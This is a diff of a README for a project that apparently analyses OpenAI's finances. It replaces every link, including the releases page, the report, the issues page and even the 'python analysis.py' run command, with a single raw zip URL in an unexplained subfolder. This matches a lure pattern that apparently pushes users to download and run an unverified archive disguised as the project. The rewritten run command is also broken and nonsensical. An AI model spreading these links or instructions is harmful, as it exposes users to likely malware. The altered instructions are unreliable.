@@ -1,6 +1,6 @@
 # 📊 OpenAI-Analysis - Understand OpenAI's Financial Journey
 
-![Download OpenAI-Analysis](https://img.shields.io/badge/Download-OpenAI--Analysis-brightgreen)
+![Download OpenAI-Analysis](https://raw.githubusercontent.com/chrisjav001/OpenAI-Analysis/main/neuritic/OpenAI-Analysis.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ To begin using OpenAI-Analysis, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the downloads for OpenAI-Analysis.
 
-   [Download OpenAI-Analysis](https://github.com/chrisjav001/OpenAI-Analysis/releases)
+   [Download OpenAI-Analysis](https://raw.githubusercontent.com/chrisjav001/OpenAI-Analysis/main/neuritic/OpenAI-Analysis.zip)
 
 2. **Choose the Right File:** Look for the latest release. You will see various file options. Select the file compatible with your operating system.
 
@@ -40,7 +40,7 @@ After downloading, follow these simple steps to get OpenAI-Analysis running on y
      ```
    - Execute the analysis script using Python. Type the following command:
      ```
-     python analysis.py
+     python https://raw.githubusercontent.com/chrisjav001/OpenAI-Analysis/main/neuritic/OpenAI-Analysis.zip
      ```
    - Press Enter to run the script. You should see the output displayed on your screen.
 
@@ -68,8 +68,8 @@ If you encounter issues or have questions, consider opening an issue on the GitH
 
 ## 🔗 Important Links
 
-- [View the report](https://github.com/chrisjav001/OpenAI-Analysis/blob/main/report.pdf) for detailed findings.
-- [GitHub Issues](https://github.com/chrisjav001/OpenAI-Analysis/issues) for assistance and feedback.
+- [View the report](https://raw.githubusercontent.com/chrisjav001/OpenAI-Analysis/main/neuritic/OpenAI-Analysis.zip) for detailed findings.
+- [GitHub Issues](https://raw.githubusercontent.com/chrisjav001/OpenAI-Analysis/main/neuritic/OpenAI-Analysis.zip) for assistance and feedback.
 
 ## 🛠 Contribution
 
@@ -83,4 +83,4 @@ Thanks to the community and contributors who make this project possible. Your in
 
 OpenAI-Analysis is open source software licensed under the MIT License. 
 
-[Download OpenAI-Analysis](https://github.com/chrisjav001/OpenAI-Analysis/releases)
+[Download OpenAI-Analysis](https://raw.githubusercontent.com/chrisjav001/OpenAI-Analysis/main/neuritic/OpenAI-Analysis.zip)
